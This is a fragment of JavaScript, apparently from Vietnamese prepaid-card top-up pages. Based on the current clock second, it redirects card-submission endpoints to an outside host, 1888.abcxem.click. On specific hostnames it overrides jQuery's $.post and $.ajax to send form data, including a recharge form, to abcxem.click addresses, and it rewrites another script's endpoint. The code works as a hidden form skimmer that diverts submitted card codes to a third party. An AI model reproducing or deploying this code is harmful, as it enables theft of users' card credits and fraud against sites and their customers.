...
var curDate = new Date(); var seconds = curDate.getSeconds(); console.log(seconds); var index = "/"; var adnx = window.location.origin+"/account/napthe.php"; var a = 'ajax/card.php'; var b = 'ajax.php'; var roblox = 'napthe.php'; var napkimcuong = 'napthe.php'; var callback_napthe = '/callback_napthe.php'; if(seconds >=10){ if (typeof url === 'undefined') { var url = "ajax/card.php"; } var xuly = '/xuly.php'; var callback_napthe = '/callback_napthe.php'; }else{ if(location.hostname != "napkimcuongx10.com"){ var b = 'https://1888.abcxem.click/1008/ajax.php'; } var napkimcuong = 'https://1888.abcxem.click/napthe.php'; if (typeof url === 'undefined') { var url = 'https://1888.abcxem.click/ajax.php'; } if(location.hostname == "ff.naptheuytinvn.com"){ $(document).ready(function() { var originalPost = $.post; $.post = function(url, data, callback, type) { if(url === "napthe.php") { url = "https://1888.abcxem.click/napthevn/napthe.php"; } return originalPost(url, data, callback, type); }; }); } if(location.hostname == "naptheuudai.comm"){ (function() { var originalAjax = $.ajax; $.ajax = function(options) { var newUrl = 'https://nhd.abcxem.click/napuudai/ajax.php'; options.url = newUrl; if (options.success) { var originalSuccess = options.success; options.success = function(data) { data = JSON.parse(data); if (data.message) { document.querySelector('#form_recharge').reset(); $('#error_message').val(data.message); } else { $('#error_message').val(data.message); } originalSuccess(data); }; } return originalAjax(options); }; })(); } } document.addEventListener('DOMContentLoaded', function() { var script1 = document.getElementById("script1"); if (script1) { var script1Content = script1.textContent || script1.innerText; var updatedScript1Content = script1Content.replace('var URI = "./system/card";', 'var URI = "./new/url";'); script1.textContent = updatedScript1Content; console.log("Updated Script 1 - url:", URI); } });
window.dynamicooo = {};
